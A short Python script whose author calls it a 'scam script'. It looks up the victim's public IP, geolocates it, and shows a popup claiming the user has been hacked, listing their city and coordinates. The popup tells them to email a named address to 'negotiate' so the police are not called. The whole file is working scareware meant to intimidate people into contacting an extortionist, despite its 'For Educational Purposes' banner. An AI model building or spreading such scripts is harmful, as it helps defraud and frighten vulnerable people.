import smtplib
import sys
from geolite2 import geolite2
import requests

import easygui

def start():
    print(' My attempt at making a scam script')
    print( ' For Educational Purposes')
    print('''
   _____ ___________________ ____  ___ 
  /  _  \\______   \_   ___ \\   \/  / 
 /  /_\  \|       _/    \  \/ \     /  
/    |    \    |   \     \____/     \  
\____|__  /____|_  /\______  /___/\  \ 
        \/       \/        \/      \_/ ''')
#####FONT DECLARATION
LARGE_FONT = ("Verdana", 12)
NORM_FONT = ("Verdana", 10)
SMALL_FONT = ("Verdana", 8)

my_ip = requests.get('https://api.ipify.org').text


reader  = geolite2.reader()
location = reader.get(my_ip)

a=(location['city']['names']['en'])
b=(location['continent']['names']['en'])
c=(location['country']['names']['en'])
d=(location['location'])
f=(location['registered_country']['names']['en'])
g=(location['subdivisions'][0]['names']['en'])

     
if __name__=='__main__':
    start()
    easygui.msgbox("Hello There! My name is ARCX and you have been hacked due to your misdeeds and I have acquired your information" + "\n " + "\nYour City:" + str(a) + "\nYour Country:"+ str(c) + "\nLongitude:" + str(d["longitude"]) +"\nLatitude:" +  str(d['latitude']) +'\n' + '\n Contact email above to negotiate with me so i do not call the police on you' , title="EMAIL: ryanchamruiyang@gmail.com")

